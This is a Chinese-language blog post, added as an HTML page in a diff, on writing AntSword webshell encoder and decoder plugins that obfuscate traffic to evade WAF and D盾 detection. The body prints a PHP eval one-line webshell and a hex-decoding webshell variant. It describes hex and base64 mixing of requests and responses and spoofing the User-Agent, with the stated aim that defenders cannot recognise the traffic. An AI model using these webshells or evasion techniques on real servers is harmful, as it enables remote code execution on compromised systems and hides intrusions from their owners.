@@ -1,0 +1,836 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon.ico?v=5.1.3">
+
+
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="蚁剑插件编写之流量加密">
+<meta property="og:type" content="article">
+<meta property="og:title" content="蚁剑插件编写之流量加密">
+<meta property="og:url" content="http://www.lxhsec.com/2020/05/01/caidaobypass/index.html">
+<meta property="og:site_name" content="lyxhh">
+<meta property="og:description" content="蚁剑插件编写之流量加密">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://www.lxhsec.com/2020/05/01/caidaobypass/cd-by-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/05/01/caidaobypass/cd-by-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/05/01/caidaobypass/cd-by-03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/05/01/caidaobypass/cd-by-04.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/05/01/caidaobypass/cd-by-05.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/05/01/caidaobypass/cd-by-06.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/05/01/caidaobypass/cd-by-07.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/05/01/caidaobypass/cd-by-08.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/05/01/caidaobypass/cd-by-09.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/05/01/caidaobypass/cd-by-10.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/05/01/caidaobypass/cd-by-15.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/05/01/caidaobypass/cd-by-11.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/05/01/caidaobypass/cd-by-12.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/05/01/caidaobypass/cd-by-13.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/05/01/caidaobypass/cd-by-14.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/05/01/caidaobypass/cd-by-16.png">
+<meta property="og:updated_time" content="2020-12-21T06:50:44.535Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="蚁剑插件编写之流量加密">
+<meta name="twitter:description" content="蚁剑插件编写之流量加密">
+<meta name="twitter:image" content="http://www.lxhsec.com/2020/05/01/caidaobypass/cd-by-01.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.lxhsec.com/2020/05/01/caidaobypass/"/>
+
+
+
+
+
+  <title>蚁剑插件编写之流量加密 | lyxhh</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">lyxhh</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.lxhsec.com/2020/05/01/caidaobypass/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lyxhh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/1.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lyxhh">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">蚁剑插件编写之流量加密</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-01T16:02:43+08:00">
+                2020-05-01
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2020-12-21T14:50:44+08:00">
+                2020-12-21
+              </time>
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>蚁剑插件编写之流量加密<a id="more"></a></p>
+<h2 id="蚁剑流量加密"><a href="#蚁剑流量加密" class="headerlink" title="蚁剑流量加密"></a>蚁剑流量加密</h2><h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>安服仔的世界总是会有各种各样的waf出现，当安服仔历尽千难，找到漏洞并绕过waf，且上传了一句话免杀shell，此时，安服仔准备享受成功的喜悦，愉快的使用蚁剑连接，结果出现了下面的图片：<br><img src="/2020/05/01/caidaobypass/cd-by-01.png" alt="cd-by-01"></p>
+<p>可见，蚁剑的流量已经被识别了，此时，安服仔决定编写蚁剑编码器从而绕过waf对蚁剑流量的识别。</p>
+<h3 id="0x02-开始"><a href="#0x02-开始" class="headerlink" title="0x02 开始"></a>0x02 开始</h3><p>安服仔决定学习下蚁剑编码器的开发方法，第一时间安服仔想到了”<a href="https://doc.u0u.us/zh-hans/core_dev/encoder/index.html" target="_blank" rel="external">官方文档</a>“，于是，安服仔打开了官方文档，并找到了编码器的页面，准备阅读时，出现了下图:<br><img src="/2020/05/01/caidaobypass/cd-by-02.png" alt="cd-by-02"></p>
+<p>安服仔学习的路途总是充满了曲折，</p>
+<p>此时 安服仔思考着，既然”官方文档”没有写，那么肯定会有其他的安服仔去问作者，安服仔决定去蚁剑项目的issues中查看，当安服仔打开issues时，果然，发现了其他安服仔的提问，如下:<br><img src="/2020/05/01/caidaobypass/cd-by-03.png" alt="cd-by-03"></p>
+<p>点进去之后，看到作者巴拉巴拉说了一堆，看的我似懂非懂，果然，终究还是一个人抗下了所有，安服仔的生活就是这么的朴实无华且枯燥。</p>
+<p>安服仔决定自己调试一下，</p>
+<h3 id="0x03-准备"><a href="#0x03-准备" class="headerlink" title="0x03 准备"></a>0x03 准备</h3><p>1、首先，安服仔打开了蚁剑的代理设置，并设置了Burp代理，让蚁剑流量通过Burp。<br><img src="/2020/05/01/caidaobypass/cd-by-04.png" alt="cd-by-04"></p>
+<p>2、打开编码管理，这里以php为例，因此我们需要创建一个php的编码器，创建完之后，默认如下:<br><img src="/2020/05/01/caidaobypass/cd-by-05.png" alt="cd-by-05"></p>
+<p>3、读一下作者给出的默认编码器，其中，pwd是我们一句话的密码，data是蚁剑的payload，这里我们二话不说，先打几个Log看看。<br><img src="/2020/05/01/caidaobypass/cd-by-06.png" alt="cd-by-06"></p>
+<p>4、设置shell的连接，指定编码器等，一句话是<code>&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</code><br><img src="/2020/05/01/caidaobypass/cd-by-07.png" alt="cd-by-07"></p>
+<p>5、开启蚁剑调试 <code>调试-&gt;开发者工具</code>，连接。<br><img src="/2020/05/01/caidaobypass/cd-by-08.png" alt="cd-by-08"></p>
+<p>日志打印的跟作者描述的一样，我们再观察数据包，也就是data的字典，最终变成了数据包中的key1=value1&amp;key2=value2，然后仔细看了下密码pass好像没在请求包里，导致了返回包也没数据，卧槽 代码删多了…，一句话是接收pass为参数的payload，所以我们更改要以pass为键名，最终如下：<br><img src="/2020/05/01/caidaobypass/cd-by-09.png" alt="cd-by-09"></p>
+<h3 id="0x04-编码请求"><a href="#0x04-编码请求" class="headerlink" title="0x04 编码请求"></a>0x04 编码请求</h3><p>正常交互之后，开始流量免杀，</p>
+<p>首先流量免杀只要让waf识别不出来信息即可，因此我们首选base64+hex或者其他一些xor等混合编码就ok了，</p>
+<p><strong>注意：</strong><br>最好不要使用AES，RSA这种加密方式，因为服务端不一定支持，而且解密也慢，兼容性不得行，写起来也特么为难安服仔，没必要使用。</p>
+<p>这里我采取hex方式，一键梭哈将键跟值都hex一次，为什么要编码键名？？有些憨批waf会检测。</p>
+<p>代码与效果如下：<br><img src="/2020/05/01/caidaobypass/cd-by-10.png" alt="cd-by-10"></p>
+<p>执行命令：<br><img src="/2020/05/01/caidaobypass/cd-by-15.png" alt="cd-by-15"></p>
+<p>shell:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $k =&gt; $v)&#123;</div><div class="line">	$kk = @pack(<span class="string">"H*"</span>, $k);</div><div class="line">	$_POST[$kk]=@pack(<span class="string">"H*"</span>, $v);</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">@<span class="keyword">eval</span>($_POST[<span class="string">'pass'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<h3 id="0x05-解码请求"><a href="#0x05-解码请求" class="headerlink" title="0x05 解码请求"></a>0x05 解码请求</h3><p>有些waf会检测返回包，创建解码器，</p>
+<p><img src="/2020/05/01/caidaobypass/cd-by-11.png" alt="cd-by-11"></p>
+<p>注明的几个地方都是调试的结果，你们可以自己打Log看看是不是这样的。</p>
+<p>效果图：<br><img src="/2020/05/01/caidaobypass/cd-by-12.png" alt="cd-by-12"></p>
+<p>返回包前面跟后面有几个字符类似于hex，这里我们将Base64编码后的结果在转换为hex，与前后的字符混淆在一起。</p>
+<p>最终如下：<br><img src="/2020/05/01/caidaobypass/cd-by-13.png" alt="cd-by-13"></p>
+<h3 id="0x06-更改UA"><a href="#0x06-更改UA" class="headerlink" title="0x06 更改UA"></a>0x06 更改UA</h3><p>1、连接shell时，自定义请求头：<br><img src="/2020/05/01/caidaobypass/cd-by-14.png" alt="cd-by-14"></p>
+<p><code>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36</code></p>
+<p>2、修改源码</p>
+<p>这个每次下载项目都要改一次…</p>
+<h3 id="0x07-测试"><a href="#0x07-测试" class="headerlink" title="0x07 测试"></a>0x07 测试</h3><p>测试D盾。<br><img src="/2020/05/01/caidaobypass/cd-by-16.png" alt="cd-by-16"></p>
+<h3 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h3><p>蚁剑编码器 最好以插件的形式来实现，也可以更改源码实现流量加密，但是改源码的方式兼容性太低了，每次换电脑都特么要改一次，流量加密没太大必要使用AES，RSA这些，多用Base64，hex，xor转换几次，基本ok，再不行的话 加点salt，salt通过参数传入，这尼玛要是能杀，安服仔当场自闭。</p>
+<p>脚本打包好了，公众号内回复：蚁剑流量加密</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>穷困潦倒的安全工作者，如果文章对您有所帮助，可以选择性打赏。</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/WeChatQR.JPG" alt="lyxhh 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    lyxhh
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://www.lxhsec.com/2020/05/01/caidaobypass/" title="蚁剑插件编写之流量加密">http://www.lxhsec.com/2020/05/01/caidaobypass/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/13/domain-penetration-protocol/" rel="next" title="内网渗透-协议篇">
+                <i class="fa fa-chevron-left"></i> 内网渗透-协议篇
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/05/14/spring/" rel="prev" title="Spring">
+                Spring <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zMjIyNy84Nzkx"></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/1.jpg"
+                alt="lyxhh" />
+            
+              <p class="site-author-name" itemprop="name">lyxhh</p>
+              <p class="site-description motion-element" itemprop="description">有你给的阳光，没有理由绝望。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">40</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.secbug.org/" title="破晓团队" target="_blank">破晓团队</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#蚁剑流量加密"><span class="nav-number">1.</span> <span class="nav-text">蚁剑流量加密</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-前言"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-开始"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 开始</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-准备"><span class="nav-number">1.3.</span> <span class="nav-text">0x03 准备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-编码请求"><span class="nav-number">1.4.</span> <span class="nav-text">0x04 编码请求</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-解码请求"><span class="nav-number">1.5.</span> <span class="nav-text">0x05 解码请求</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-更改UA"><span class="nav-number">1.6.</span> <span class="nav-text">0x06 更改UA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x07-测试"><span class="nav-number">1.7.</span> <span class="nav-text">0x07 测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x08-总结"><span class="nav-number">1.8.</span> <span class="nav-text">0x08 总结</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lyxhh</span>
+
+  
+</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
